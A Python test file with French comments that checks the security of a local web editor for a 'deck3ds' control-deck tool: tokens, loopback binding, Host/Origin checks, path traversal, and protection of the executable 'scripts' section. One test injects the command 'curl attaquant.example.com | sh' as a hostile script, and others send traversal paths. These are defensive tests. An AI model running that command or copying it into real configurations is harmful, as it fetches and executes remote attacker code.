from __future__ import annotations

import asyncio
import json
import shutil
import tempfile
import unittest
from pathlib import Path


from deck3ds import config as config_module
from deck3ds.server import Options as ServerOptions, Server


from .fixtures import FakePlatform, minimal_config


class TestUiSecurity(unittest.IsolatedAsyncioTestCase):
    """L'interface écrit des commandes exécutables : ces gardes sont vitaux."""

    async def asyncSetUp(self):
        from deck3ds.api.server import UiServer

        directory = Path(tempfile.mkdtemp())
        self.path = directory / "config.json"
        raw = minimal_config()
        raw["scripts"] = {"sauvegarde": ["/bin/echo", "bonjour"]}
        raw["pages"][0]["buttons"].append(
            {
                "id": "s1",
                "slot": 1,
                "label": "Script",
                "action": {"type": "script.run", "script": "sauvegarde"},
            }
        )
        self.path.write_text(json.dumps(raw), encoding="utf-8")

        loaded = config_module.load(self.path)
        self.server = Server(
            loaded, FakePlatform(), ServerOptions(config_path=self.path)
        )

        self.ui = UiServer(self.server.services, port=0, log=lambda message: None)
        await self.ui.start()
        self.port = self.ui._server.sockets[0].getsockname()[1]

    async def asyncTearDown(self):
        await self.ui.close()
        await self.server.close()
        shutil.rmtree(self.path.parent)

    async def request(
        self,
        method: str,
        target: str,
        body: object = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, dict]:
        """Émet une requête brute et retourne (code, charge décodée)."""
        reader, writer = await asyncio.open_connection("127.0.0.1", self.port)

        lines = [f"{method} {target} HTTP/1.1"]
        merged = {"Host": "127.0.0.1", "Connection": "close"}
        merged.update(headers or {})

        payload = b""
        if body is not None:
            payload = json.dumps(body).encode("utf-8")
            merged["Content-Type"] = "application/json"
            merged["Content-Length"] = str(len(payload))

        for name, value in merged.items():
            lines.append(f"{name}: {value}")

        writer.write(("\r\n".join(lines) + "\r\n\r\n").encode("latin-1") + payload)
        await writer.drain()

        raw = await reader.read()
        writer.close()

        head, _, tail = raw.partition(b"\r\n\r\n")
        status = int(head.split(b" ")[1])

        try:
            return status, json.loads(tail.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            return status, {}

    def authorised(self) -> dict[str, str]:
        return {"X-Deck3DS-Token": self.ui.token}

    async def test_ecoute_uniquement_en_local(self):
        """L'éditeur ne doit jamais être joignable depuis le réseau."""
        host = self.ui._server.sockets[0].getsockname()[0]
        self.assertEqual(host, "127.0.0.1")

    async def test_sans_jeton_refuse(self):
        status, _ = await self.request("GET", "/api/config")
        self.assertEqual(status, 403)

    async def test_jeton_invalide_refuse(self):
        status, _ = await self.request(
            "GET", "/api/config", headers={"X-Deck3DS-Token": "faux"}
        )
        self.assertEqual(status, 403)

    async def test_jeton_dans_l_url_accepte(self):
        """Le lien affiché au démarrage doit fonctionner tel quel."""
        status, _ = await self.request("GET", f"/api/config?token={self.ui.token}")
        self.assertEqual(status, 200)

    async def test_hote_etranger_refuse(self):
        """Ferme la réattribution de nom de domaine vers 127.0.0.1."""
        status, _ = await self.request(
            "GET",
            "/api/config",
            headers={"Host": "attaquant.example.com", **self.authorised()},
        )
        self.assertEqual(status, 403)

    async def test_origine_etrangere_refusee_en_ecriture(self):
        status, _ = await self.request(
            "PUT",
            "/api/config",
            body=config_module.to_raw(self.server.config),
            headers={"Origin": "http://attaquant.example.com", **self.authorised()},
        )
        self.assertEqual(status, 403)

    async def test_traversee_de_repertoire_refusee(self):
        for target in ("/../config.json", "/..%2f..%2fconfig.json"):
            status, _ = await self.request("GET", target)
            self.assertEqual(status, 403, target)

    async def test_scripts_non_modifiables(self):
        """Le point critique : aucune commande ne doit entrer par le réseau.

        `scripts` est la seule section décrivant des programmes à exécuter.
        L'accepter depuis un navigateur ferait de l'interface un moyen
        d'exécuter du code arbitraire.
        """
        candidate = config_module.to_raw(self.server.config)
        candidate["scripts"] = {
            "sauvegarde": ["/bin/sh", "-c", "curl attaquant.example.com | sh"]
        }

        status, payload = await self.request(
            "PUT", "/api/config", body=candidate, headers=self.authorised()
        )
        self.assertEqual(status, 200)

        # Le fichier doit conserver la commande d'origine.
        written = json.loads(self.path.read_text(encoding="utf-8"))
        self.assertEqual(written["scripts"], {"sauvegarde": ["/bin/echo", "bonjour"]})
        self.assertEqual(
            payload["config"]["scripts"], {"sauvegarde": ["/bin/echo", "bonjour"]}
        )

    async def test_methode_inconnue_refusee(self):
        status, _ = await self.request(
            "DELETE", "/api/config", headers=self.authorised()
        )
        self.assertEqual(status, 405)

    async def test_route_inconnue(self):
        status, _ = await self.request(
            "GET", "/api/inexistant", headers=self.authorised()
        )
        self.assertEqual(status, 404)

    async def test_jeton_accepte_en_entete_seul(self):
        """La page rechargée n'a plus le jeton dans l'URL, seulement en en-tête.

        Régression : l'interface effaçait le jeton de la barre d'adresse sans le
        conserver, si bien que le premier rechargement le perdait et la page se
        déclarait orpheline. Elle le garde désormais dans `sessionStorage` et le
        présente en en-tête ; ce chemin doit donc rester valide sans aucun
        paramètre d'URL.
        """
        status, _ = await self.request(
            "GET", "/api/state", headers={"X-Deck3DS-Token": self.ui.token}
        )
        self.assertEqual(status, 200)

    async def test_catalogue_applications_pour_le_selecteur(self):
        """Le navigateur ne doit pas demander à l'utilisateur de deviner un nom."""
        status, payload = await self.request(
            "GET", "/api/apps", headers=self.authorised()
        )
        self.assertEqual(status, 200)
        self.assertEqual(payload, {"apps": ["Terminal", "Safari"]})

    async def test_selecteur_natif_de_fichier(self):
        selected = []

        def choose(kind):
            selected.append(kind)
            return "/Users/test/Documents/rapport.pdf"

        self.server.platform.choose_path = choose
        status, payload = await self.request(
            "POST",
            "/api/paths/pick",
            body={"kind": "file"},
            headers=self.authorised(),
        )

        self.assertEqual(status, 200)
        self.assertEqual(payload["path"], "/Users/test/Documents/rapport.pdf")
        self.assertFalse(payload["cancelled"])
        self.assertEqual(selected, ["file"])

    async def test_selecteur_natif_annule_proprement(self):
        from deck3ds.platforms.base import SelectionCancelled

        def cancel(_kind):
            raise SelectionCancelled

        self.server.platform.choose_path = cancel
        status, payload = await self.request(
            "POST",
            "/api/paths/pick",
            body={"kind": "folder"},
            headers=self.authorised(),
        )

        self.assertEqual(status, 200)
        self.assertTrue(payload["cancelled"])
        self.assertEqual(payload["path"], "")

    async def test_selecteur_natif_refuse_un_type_inconnu(self):
        status, _ = await self.request(
            "POST",
            "/api/paths/pick",
            body={"kind": "commande"},
            headers=self.authorised(),
        )
        self.assertEqual(status, 422)

    async def test_ouverture_d_une_autorisation_systeme(self):
        opened = []
        self.server.platform.open_permission_settings = opened.append

        status, payload = await self.request(
            "POST",
            "/api/permissions/open",
            body={"permission": "notifications"},
            headers=self.authorised(),
        )

        self.assertEqual(status, 200)
        self.assertEqual(payload, {"opened": True, "permission": "notifications"})
        self.assertEqual(opened, ["notifications"])

    async def test_autorisation_systeme_invalide_refusee(self):
        status, _ = await self.request(
            "POST",
            "/api/permissions/open",
            body={},
            headers=self.authorised(),
        )
        self.assertEqual(status, 422)

    async def test_interface_conserve_le_jeton_entre_rechargements(self):
        """Le module d'accès doit mémoriser le jeton, sinon F5 casse la page.

        Vérifié sur la ressource réellement servie : le défaut se situait
        entièrement côté navigateur et aucun test de l'API ne pouvait le voir.
        """
        import re

        status, _ = await self.request("GET", "/")
        self.assertEqual(status, 200)
        index = (self.ui.static_root / "index.html").read_text(encoding="utf-8")
        for asset in re.findall(r'(?:src|href)="(/[^"]+\.(?:js|css|png))"', index):
            with self.subTest(asset=asset):
                asset_status, _ = await self.request("GET", asset)
                self.assertEqual(asset_status, 200)

        script = (
            self.ui.static_root.parents[3] / "frontend" / "src" / "api" / "client.ts"
        ).read_text(encoding="utf-8")
        self.assertIn("sessionStorage", script)
        # Le jeton doit être mémorisé avant d'être retiré de l'URL, sans quoi
        # l'effacement le perdrait définitivement.
        self.assertLess(
            script.index("sessionStorage.setItem"),
            script.index("history.replaceState"),
            "le jeton doit etre memorise avant d'etre retire de l'URL",
        )
